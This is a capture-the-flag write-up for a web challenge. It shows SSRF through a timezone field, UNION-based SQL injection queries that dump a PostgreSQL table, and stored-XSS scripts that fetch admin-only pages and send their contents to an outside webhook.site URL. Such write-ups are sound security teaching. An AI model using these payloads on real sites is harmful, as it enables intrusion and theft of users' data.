# Write-up for http://web.kazet.cc:31339/

## **SSRF** - http://web.kazet.cc:31339/time
By checking the Network tab, we can see that when loading any sub-page, 3 POST requests are being sent to the `/time` endpoint, with the timezone specified in their JSON like so:
```
curl 'http://web.kazet.cc:31339/time' \
-X POST 
-H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0' \
-H 'Accept: */*' \
-H 'Accept-Language: en-US,en;q=0.5' \
-H 'Accept-Encoding: gzip, deflate' \
-H 'Referer: http://web.kazet.cc:31339/send_article' \
-H 'Content-Type: application/json' \
-H 'Origin: http://web.kazet.cc:31339' \
-H 'Connection: keep-alive' \
-H 'Cookie: session=.eJwlzj0OwyAMQOG7MHcA_2Ccy0TYGLXKRpqp6t0bqeNbnr5P2ueK85m297rikfbXSFsaED2rMJJQmzEGEBfTbFypC7K45qI1MimzewxTbVrEgjpgdmfrMqYjEgv3aiI4hRQhc1Fx9-I4GkHMgDutRC73OdwbTIB0Q64z1l9zHARaQdP3B-FdMPk.Y11nRg.A9mOvfpy2LOQt4lHOZ5tG4wveCY' \
--data-raw '{"timezone":"newyork"}'
```
Let's try inputting a timezone not specified in the page's [script](http://web.kazet.cc:31339/static/script.js). By doing that we get an error message along the lines of:
```
{"info":"nie uda\u0142o si\u0119 pobra\u0107 http://dubai.timezone.internal","status":"error"}
```
Thus, `newyork` and the others must have been addresses of some internal services. Substuting the city name for `localhost` and adding "`/?`" leads to the "`.timezone.internal`" suffix being treated as a GET request's parameter. Reiterating, we call the curl above, tweaking the last line:
```
--data-raw '{"timezone":"localhost/?"}'
```
and it outputs the flag:
```
{"info":"FLAG{0c55606a072a912d264846cd22c95020e781}","status":"ok"}
```
---
## **SQL Injection** - http://web.kazet.cc:31339/stats/{year}
Resources used:
- https://portswigger.net/web-security/sql-injection/union-attacks
- https://portswigger.net/web-security/sql-injection/examining-the-database

After inputting an non-numeric string in place of the `year` in the url, we are presented with an SQL error. This hints to a SQL Injection being possible. Let's examine the database:
```pgsql
web.kazet.cc:31339/stats/1 AND 1 = 0 UNION SELECT version(), NULL --
```
The output is `PostgreSQL 15.0`. After playing with the `UNION` statement, we come to the conclusion that we can query two fields and the first one contains a string. With this knowledge, let's try to learn the database's tables, which in PostgreSQL is done by querying `information_schema.tables`:
```pgsql
web.kazet.cc:31339/stats/1 OR 1=0 UNION ALL SELECT table_name, NULL FROM information_schema.tables OFFSET 3--
```
We use the `UNION ALL` operator for no rows to get lost. The output shows a table with the name `interesting_and_secret_information`. The name suggests it is what we're looking for. Let's query its columns:
```pgsql
web.kazet.cc:31339/stats/1 OR 1=0 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='interesting_and_secret_information'--
```
This outputs a column with the name `secret_text_for_example_a_flag`. Let's view its type:
```pgsql
web.kazet.cc:31339/stats/1 OR 1=0 UNION SELECT data_type, NULL FROM information_schema.columns WHERE column_name='secret_text_for_example_a_flag'--
```

What's left is to view that secret text:
```pgsql
http://web.kazet.cc:31339/stats/1 OR 1=0 UNION SELECT secret_text_for_example_a_flag, NULL FROM interesting_and_secret_information --
```
It outputs:
```
FLAG{this_is_a_long_and_interesting_flag_9393265140f32ff7...
```
So we're almost there. Let's query for a substring of that result:
```pgsql
http://web.kazet.cc:31339/stats/1 OR 1=0 UNION ALL SELECT substring(secret_text_for_example_a_flag, 18), NULL FROM interesting_and_secret_information --
```
And so we get the entire flag:
```
ng_and_interesting_flag_9393265140f32ff7fc9f3b5bc9c065b3e6fdc4f4}
```

---
## **XSS** - http://web.kazet.cc:31339/send_article
Let's copy the POST request that submits the article for further use:
```
curl 'http://web.kazet.cc:31339/send_article' \
-X POST \
-H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0' \
-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' \
-H 'Accept-Language: en-US,en;q=0.5' \
-H 'Accept-Encoding: gzip, deflate' \
-H 'Content-Type: application/x-www-form-urlencoded' \
-H 'Origin: http://web.kazet.cc:31339' \
-H 'Connection: keep-alive' \
-H 'Referer: http://web.kazet.cc:31339/send_article' \
-H 'Cookie: session=.eJwlzj0OwyAMQOG7MHcA_2Ccy0TYGLXKRpqp6t0bqeNbnr5P2ueK85m297rikfbXSFsaED2rMJJQmzEGEBfTbFypC7K45qI1MimzewxTbVrEgjpgdmfrMqYjEgv3aiI4hRQhc1Fx9-I4GkHMgDutRC73OdwbTIB0Q64z1l9zHARaQdP3B-FdMPk.Y10YlA.tnVOglW7kp0X9pNztyb1ZEDXZ9E' \
-H 'Upgrade-Insecure-Requests: 1' \
--data-raw 'article=%3Cp%3E<CONTENTS>%3C%2Fp%3E'
```
where `<CONTENTS>` is whatever whe enter in the field, naturally it has to be [url-encoded](https://www.urlencoder.org/).

By viewing the input box's HTML it's evident that one can input any valid HTML, there's also no need for the enclosing `<p>` tags. So why not try some simple JS that pings a webhook of ours?
```html
<script>
   const webhook = 'https://webhook.site/82310b30-bdb3-45f9-8d46-92f9c44fcf0d';
   window.location.href = webhook + "?data=" + encodeURIComponent(document.body.innerHTML)
</script>
```
By executing this with the previous curl we get the webpage's HTML from the admin's perspective, which provides an additional tab/endpoint: `/send_feedback`. Let's refine our XSS script to view that sub-page:
```html
<script>
   const webhook = 'https://webhook.site/82310b30-bdb3-45f9-8d46-92f9c44fcf0d';

   fetch('/send_feedback')
      .then(response => response.text())
      .then(data => window.location.href = webhook + "?data=" + encodeURIComponent(data))
      .catch(err => window.location.href = webhook + "?err="  + encodeURIComponent(err));
</script>
```
On that sub-page we see a [Bootstrap form](https://getbootstrap.com/docs/4.0/components/forms/) and deduce the page can be queried with a POST request and a JSON whose fields are:
`["receiver", "content", "debug"]`. The `debug` checkbox looks promising - according to the comment, checking it will provide us with the system's diagnostic data. Let's try that:
```html
<script>
   const webhook = 'https://webhook.site/82310b30-bdb3-45f9-8d46-92f9c44fcf0d';
   var formData = new FormData();
   formData.append('receiver', 'kk429629'); // my login for the page
   formData.append('content', "Here's your diagnostics:");
   formData.append('debug', 'on');

   fetch('/send_feedback', { method: 'POST', body: formData })
      .then(response => response.text())
      .then(data => window.location.href = webhook + "?data=" + encodeURIComponent(data))
      .catch(err => window.location.href = webhook + "?err="  + encodeURIComponent(err));
</script>
```
After refreshing the page, we get:
```
Informacja zwrotna: Here's your diagnostics:
flaga: FLAG{752e8db03d875cfec6bdf8305756f1bb} 
```
